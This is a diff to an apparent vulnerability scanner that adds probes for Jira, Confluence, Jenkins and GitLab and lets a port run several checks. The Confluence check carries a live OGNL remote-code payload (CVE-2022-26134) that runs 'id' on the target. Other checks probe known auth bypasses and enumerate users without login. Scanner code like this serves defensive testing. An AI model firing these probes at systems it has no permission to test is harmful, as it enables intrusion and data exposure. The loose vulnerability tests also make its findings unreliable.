@@ -2057,6 +2057,318 @@ async def check_envoy_admin(host, port, target, resolved_ip):
     return out
 
 
+# ─── Jira (8080 / 8090) ──────────────────────────────────────────────────────
+
+async def check_jira(host, port, target, resolved_ip):
+    out = []
+    scheme = 'https' if port == 8443 else 'http'
+    async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as client:
+        # Detect Jira via /rest/api/2/serverInfo
+        try:
+            r = await client.get(f'{scheme}://{host}:{port}/rest/api/2/serverInfo')
+            if r.status_code == 200 and any(w in r.text.lower() for w in ('jira', 'atlassian')):
+                ver_match = re.search(r'"version"\s*:\s*"([^"]+)"', r.text)
+                version = ver_match.group(1) if ver_match else 'unknown'
+                out.append(_finding('INFO', 'INFO', 'Jira Instance Detected',
+                    f'Jira serverInfo accessible without auth. Version: {version}',
+                    target, resolved_ip, port,
+                    url=f'{scheme}://{host}:{port}/rest/api/2/serverInfo',
+                    http_status=r.status_code, service_version=version))
+            else:
+                return out
+        except Exception:
+            return out
+
+        # CVE-2022-0540 — Seraph auth filter bypass
+        try:
+            r = await client.get(
+                f'{scheme}://{host}:{port}/rest/api/2/issue/NADA-1',
+                headers={'X-Atlassian-Token': 'no-check'})
+            if r.status_code not in (401, 403):
+                out.append(_finding('VULNERABLE', 'CRITICAL',
+                    'CVE-2022-0540 Jira Auth Filter Bypass',
+                    'Jira /rest/api/2/issue/NADA-1 returned HTTP '
+                    f'{r.status_code} with X-Atlassian-Token: no-check header — '
+                    'Seraph authentication filter bypass (CVE-2022-0540).',
+                    target, resolved_ip, port,
+                    url=f'{scheme}://{host}:{port}/rest/api/2/issue/NADA-1',
+                    payload_url=f'{scheme}://{host}:{port}/rest/api/2/issue/NADA-1',
+                    http_status=r.status_code))
+        except Exception:
+            pass
+
+        # Dashboard public access check
+        try:
+            r = await client.get(f'{scheme}://{host}:{port}/secure/Dashboard.jspa')
+            body_lower = r.text.lower()
+            if r.status_code == 200 and 'dashboard' in body_lower and 'login' not in body_lower:
+                out.append(_finding('VULNERABLE', 'HIGH',
+                    'Jira Dashboard Publicly Accessible',
+                    'Jira /secure/Dashboard.jspa accessible without login redirect.',
+                    target, resolved_ip, port,
+                    url=f'{scheme}://{host}:{port}/secure/Dashboard.jspa',
+                    http_status=r.status_code))
+        except Exception:
+            pass
+
+        # Unauthenticated project listing
+        try:
+            r = await client.get(f'{scheme}://{host}:{port}/rest/api/2/project')
+            if r.status_code == 200 and r.text.strip().startswith('['):
+                out.append(_finding('VULNERABLE', 'HIGH',
+                    'Jira Project Listing Unauthenticated',
+                    'Jira /rest/api/2/project returned a JSON array without auth — '
+                    'full project list exposed.',
+                    target, resolved_ip, port,
+                    url=f'{scheme}://{host}:{port}/rest/api/2/project',
+                    http_status=r.status_code))
+        except Exception:
+            pass
+    return out
+
+
+# ─── Confluence (8090 / 8443) ────────────────────────────────────────────────
+
+async def check_confluence(host, port, target, resolved_ip):
+    out = []
+    scheme = 'https' if port == 8443 else 'http'
+    async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as client:
+        # Detect Confluence via /rest/api/space
+        try:
+            r = await client.get(f'{scheme}://{host}:{port}/rest/api/space')
+            if r.status_code == 200 and any(
+                w in r.text.lower() for w in ('atlassian', 'confluence')
+            ):
+                out.append(_finding('INFO', 'INFO', 'Confluence Detected',
+                    'Confluence /rest/api/space accessible without auth.',
+                    target, resolved_ip, port,
+                    url=f'{scheme}://{host}:{port}/rest/api/space',
+                    http_status=r.status_code))
+            else:
+                return out
+        except Exception:
+            return out
+
+        # CVE-2022-26134 — OGNL RCE (unauthenticated)
+        ognl_path = '/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D/index.action'
+        try:
+            baseline = await client.get(f'{scheme}://{host}:{port}/index.action')
+            r = await client.get(f'{scheme}://{host}:{port}{ognl_path}')
+            # Flag if: returns 200 with body different from baseline, or any non-404 response
+            is_vuln = (
+                r.status_code == 200 and r.text != baseline.text
+            ) or r.status_code not in (404, 400, 302)
+            if is_vuln:
+                out.append(_finding('VULNERABLE', 'CRITICAL',
+                    'CVE-2022-26134 Confluence OGNL Injection (Unauth RCE)',
+                    'Confluence OGNL injection endpoint responded to payload path — '
+                    'potential unauthenticated RCE (CVE-2022-26134). '
+                    f'HTTP {r.status_code}.',
+                    target, resolved_ip, port,
+                    url=f'{scheme}://{host}:{port}{ognl_path}',
+                    payload_url=f'{scheme}://{host}:{port}{ognl_path}',
+                    http_status=r.status_code))
+        except Exception:
+            pass
+
+        # CVE-2023-22518 — improper authorization via setup-restore
+        try:
+            r = await client.post(
+                f'{scheme}://{host}:{port}/json/setup-restore.action',
+                content=b'')
+            if r.status_code not in (401, 403):
+                out.append(_finding('VULNERABLE', 'CRITICAL',
+                    'CVE-2023-22518 Confluence Improper Authorization',
+                    'Confluence /json/setup-restore.action returned HTTP '
+                    f'{r.status_code} without authentication — '
+                    'CVE-2023-22518 improper authorization.',
+                    target, resolved_ip, port,
+                    url=f'{scheme}://{host}:{port}/json/setup-restore.action',
+                    payload_url=f'{scheme}://{host}:{port}/json/setup-restore.action',
+                    http_status=r.status_code))
+        except Exception:
+            pass
+
+        # Unauthenticated space listing
+        try:
+            r = await client.get(f'{scheme}://{host}:{port}/rest/api/space?limit=10')
+            if r.status_code == 200 and r.text.strip().startswith('{'):
+                try:
+                    data = r.json()
+                    if 'results' in data or 'spaces' in str(data).lower():
+                        out.append(_finding('VULNERABLE', 'HIGH',
+                            'Confluence Space Listing Unauthenticated',
+                            'Confluence /rest/api/space?limit=10 returned space data without auth.',
+                            target, resolved_ip, port,
+                            url=f'{scheme}://{host}:{port}/rest/api/space?limit=10',
+                            http_status=r.status_code))
+                except Exception:
+                    pass
+        except Exception:
+            pass
+    return out
+
+
+# ─── Jenkins CVEs (8080) ─────────────────────────────────────────────────────
+
+async def check_jenkins_cves(host, port, target, resolved_ip):
+    out = []
+    async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as client:
+        # CVE-2024-23897 — Jenkins CLI arbitrary file read
+        # Check if CLI endpoint is reachable and exposes Jenkins-specific headers
+        for cli_path in ('/cli', '/jenkins/cli'):
+            try:
+                r = await client.get(f'http://{host}:{port}{cli_path}')
+                has_jenkins_hdr = (
+                    'x-jenkins' in r.headers
+                    or 'x-instance-identity' in r.headers
+                    or 'x-jenkins-session' in r.headers
+                )
+                if has_jenkins_hdr:
+                    out.append(_finding('VULNERABLE', 'CRITICAL',
+                        'CVE-2024-23897 Jenkins CLI Reachable',
+                        f'Jenkins CLI endpoint at {cli_path} is reachable and exposes '
+                        'Jenkins-specific headers (X-Jenkins / X-Instance-Identity). '
+                        'Arbitrary file read via Jenkins CLI possible (CVE-2024-23897).',
+                        target, resolved_ip, port,
+                        url=f'http://{host}:{port}{cli_path}',
+                        payload_url=f'http://{host}:{port}{cli_path}',
+                        http_status=r.status_code))
+                    break
+            except Exception:
+                continue
+
+        # CVE-2024-23897 — probe CLI remoting endpoint with Jenkins protocol header
+        try:
+            r = await client.post(
+                f'http://{host}:{port}/cli?remoting=false',
+                content=b'\x00\x00\x00\x00\x14\x00\x00\x00\x01',
+                headers={'Content-Type': 'application/octet-stream'})
+            has_jenkins_hdr = (
+                'x-jenkins' in r.headers
+                or 'x-instance-identity' in r.headers
+            )
+            # Any non-connection-refused response with Jenkins headers is suspicious
+            if has_jenkins_hdr or r.status_code in (200, 403, 404):
+                # Only flag if we haven't already found CLI exposure above
+                already_flagged = any(
+                    'CVE-2024-23897' in f.get('vulnerability', '') for f in out
+                )
+                if not already_flagged and has_jenkins_hdr:
+                    out.append(_finding('POTENTIAL', 'CRITICAL',
+                        'CVE-2024-23897 Jenkins CLI Remoting Endpoint Reachable',
+                        'Jenkins /cli?remoting=false responded to Jenkins remoting '
+                        'protocol probe with Jenkins-specific headers — '
+                        'arbitrary file read via CLI may be possible (CVE-2024-23897).',
+                        target, resolved_ip, port,
+                        url=f'http://{host}:{port}/cli?remoting=false',
+                        payload_url=f'http://{host}:{port}/cli?remoting=false',
+                        http_status=r.status_code))
+        except Exception:
+            pass
+    return out
+
+
+# ─── GitLab (80 / 443) ───────────────────────────────────────────────────────
+
+async def check_gitlab(host, port, target, resolved_ip):
+    out = []
+    scheme = 'https' if port == 443 else 'http'
+    async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as client:
+        # Detect GitLab at root
+        try:
+            r = await client.get(f'{scheme}://{host}:{port}/')
+            body_lower = r.text.lower()
+            hdr_server = r.headers.get('server', '').lower()
+            hdr_powered = r.headers.get('x-powered-by', '').lower()
+            is_gitlab = (
+                'gitlab' in body_lower
+                or 'gitlab' in hdr_server
+                or 'gitlab' in hdr_powered
+                or any('gitlab' in v.lower() for v in r.headers.values())
+            )
+            if not is_gitlab:
+                return out
+
+            edition = 'Enterprise Edition' if 'gitlab ee' in body_lower else (
+                'Community Edition' if 'gitlab ce' in body_lower else 'unknown edition'
+            )
+            out.append(_finding('INFO', 'INFO', 'GitLab Instance Detected',
+                f'GitLab detected ({edition}) at {scheme}://{host}:{port}/.',
+                target, resolved_ip, port,
+                url=f'{scheme}://{host}:{port}/',
+                http_status=r.status_code))
+        except Exception:
+            return out
+
+        # Version disclosure via /api/v4/version (requires auth in newer versions)
+        try:
+            r = await client.get(f'{scheme}://{host}:{port}/api/v4/version')
+            if r.status_code == 200:
+                ver_match = re.search(r'"version"\s*:\s*"([^"]+)"', r.text)
+                version = ver_match.group(1) if ver_match else r.text[:80]
+                out.append(_finding('INFO', 'INFO', 'GitLab Version Disclosed',
+                    f'GitLab /api/v4/version accessible without auth. Version: {version}',
+                    target, resolved_ip, port,
+                    url=f'{scheme}://{host}:{port}/api/v4/version',
+                    http_status=r.status_code, service_version=version))
+        except Exception:
+            pass
+
+        # Unauthenticated user enumeration
+        try:
+            r = await client.get(f'{scheme}://{host}:{port}/api/v4/users?per_page=20')
+            if r.status_code == 200 and r.text.strip().startswith('['):
+                try:
+                    data = r.json()
+                    if isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict):
+                        if any(k in data[0] for k in ('username', 'name', 'id')):
+                            out.append(_finding('VULNERABLE', 'HIGH',
+                                'GitLab User Enumeration Unauthenticated',
+                                f'GitLab /api/v4/users returned {len(data)} user(s) without auth.',
+                                target, resolved_ip, port,
+                                url=f'{scheme}://{host}:{port}/api/v4/users?per_page=20',
+                                http_status=r.status_code))
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+        # Public projects
+        try:
+            r = await client.get(
+                f'{scheme}://{host}:{port}/api/v4/projects?visibility=public&per_page=5')
+            if r.status_code == 200 and r.text.strip().startswith('['):
+                try:
+                    data = r.json()
+                    if isinstance(data, list) and len(data) > 0:
+                        out.append(_finding('VULNERABLE', 'HIGH',
+                            'GitLab Public Projects Exposed',
+                            f'GitLab /api/v4/projects?visibility=public returned '
+                            f'{len(data)} project(s) without auth.',
+                            target, resolved_ip, port,
+                            url=f'{scheme}://{host}:{port}/api/v4/projects?visibility=public&per_page=5',
+                            http_status=r.status_code))
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+        # Registration enabled check
+        try:
+            r = await client.get(f'{scheme}://{host}:{port}/users/sign_in')
+            if r.status_code == 200 and 'register' in r.text.lower():
+                out.append(_finding('INFO', 'INFO', 'GitLab Registration Enabled',
+                    'GitLab sign-in page contains a registration link — '
+                    'open registration may be enabled.',
+                    target, resolved_ip, port,
+                    url=f'{scheme}://{host}:{port}/users/sign_in',
+                    http_status=r.status_code))
+        except Exception:
+            pass
+    return out
+
+
 # ─── Fingerprint helper ──────────────────────────────────────────────────────
 
 async def _fingerprint(host, port, timeout=5):
@@ -2098,6 +2410,9 @@ async def _fingerprint(host, port, timeout=5):
                     ('loki',          ['loki']),
                     ('jaeger',        ['jaeger']),
                     ('alertmanager',  ['alertmanager']),
+                    ('jira',          ['jira', 'atlassian jira']),
+                    ('confluence',    ['confluence', 'atlassian confluence']),
+                    ('gitlab',        ['gitlab']),
                 ]:
                     if any(m in blob for m in markers):
                         tags.add(tag)
@@ -2118,6 +2433,7 @@ PORT_DISPATCH = {
     22:    check_ssh,
     25:    check_smtp,
     53:    check_dns,
+    80:    check_gitlab,
     88:    check_kerberos,
     111:   check_rpc,
     123:   check_ntp,
@@ -2125,6 +2441,7 @@ PORT_DISPATCH = {
     139:   check_smb,
     161:   check_snmp,
     389:   check_ldap,
+    443:   check_gitlab,
     445:   check_smb,
     465:   check_smtp,
     587:   check_smtp,
@@ -2159,15 +2476,16 @@ PORT_DISPATCH = {
     7002:  check_weblogic,
     8000:  check_splunk,
     8009:  check_ajp,
-    8080:  check_spring_actuator,
+    8080:  [check_spring_actuator, check_jenkins, check_jenkins_cves,
+            check_jira, check_tomcat, check_traefik],
     8081:  check_nexus,
     8082:  check_artifactory,
     8088:  check_hadoop_yarn,
     8089:  check_splunk,
-    8090:  check_spring_actuator,
+    8090:  [check_spring_actuator, check_jira, check_confluence],
     8111:  check_teamcity,
     8200:  check_vault,
-    8443:  check_spring_actuator,
+    8443:  [check_spring_actuator, check_tomcat, check_confluence],
     8500:  check_consul,
     8501:  check_consul,
     8778:  check_jolokia,
@@ -2197,13 +2515,17 @@ PORT_DISPATCH = {
 
 
 # Ports where multiple services compete — fingerprint before running checks
-SHARED_PORTS = {8080, 8081, 8082, 8083, 8090, 8443, 9000, 9001, 9443}
+SHARED_PORTS = {80, 443, 8080, 8081, 8082, 8083, 8090, 8443, 9000, 9001, 9443}
 
 # Map check function → required fingerprint tag (None = always run)
 CHECK_REQUIRES_TAG = {
     check_spring_actuator: 'spring',
     check_tomcat:          'tomcat',
     check_jenkins:         'jenkins',
+    check_jenkins_cves:    'jenkins',
+    check_jira:            'jira',
+    check_confluence:      'confluence',
+    check_gitlab:          'gitlab',
     check_traefik:         'traefik',
     check_jboss:           'jboss',
     check_hadoop_yarn:     'yarn',
@@ -2229,24 +2551,32 @@ async def run_scans(target_obj, port, **_kwargs):
     resolved_ip  = target_obj.get('resolved_ip', scan_address)
     display      = target_obj.get('display_target', scan_address)
 
-    check_fn = PORT_DISPATCH.get(port)
-    if check_fn is None:
+    entry = PORT_DISPATCH.get(port)
+    if entry is None:
         return []
 
-    # On shared ports, fingerprint first and skip if the service tag is absent
-    required_tag = CHECK_REQUIRES_TAG.get(check_fn)
-    if required_tag and port in SHARED_PORTS:
+    # Normalise to list so single-function and multi-function ports share one path
+    check_fns = entry if isinstance(entry, list) else [entry]
+
+    # On shared ports, fingerprint once and filter checks by their required tag
+    tags = None
+    if port in SHARED_PORTS:
         tags = await _fingerprint(scan_address, port)
-        if required_tag not in tags:
-            return []
 
-    try:
-        findings = await check_fn(scan_address, port, display, resolved_ip)
-    except Exception as e:
-        print(f"  [!] service_recon error on {scan_address}:{port} — {e}")
-        return []
+    all_findings = []
+    for check_fn in check_fns:
+        required_tag = CHECK_REQUIRES_TAG.get(check_fn)
+        if required_tag and port in SHARED_PORTS:
+            if tags is None or required_tag not in tags:
+                continue
+        try:
+            findings = await check_fn(scan_address, port, display, resolved_ip)
+        except Exception as e:
+            print(f"  [!] service_recon error on {scan_address}:{port} ({check_fn.__name__}) — {e}")
+            continue
+        all_findings.extend(findings)
 
-    for f in findings:
+    for f in all_findings:
         f['module'] = MODULE_NAME
 
-    return findings
+    return all_findings
